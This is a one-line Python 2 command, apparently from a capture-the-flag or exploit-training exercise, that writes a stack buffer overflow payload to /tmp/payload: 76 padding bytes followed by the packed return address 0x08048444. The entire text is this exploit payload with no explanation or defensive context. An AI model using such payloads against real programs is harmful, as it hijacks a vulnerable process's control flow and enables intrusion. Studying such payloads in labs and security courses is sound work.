python -c 'import struct; print "A" * 76 + struct.pack("<I", 0x08048444)' > /tmp/payload
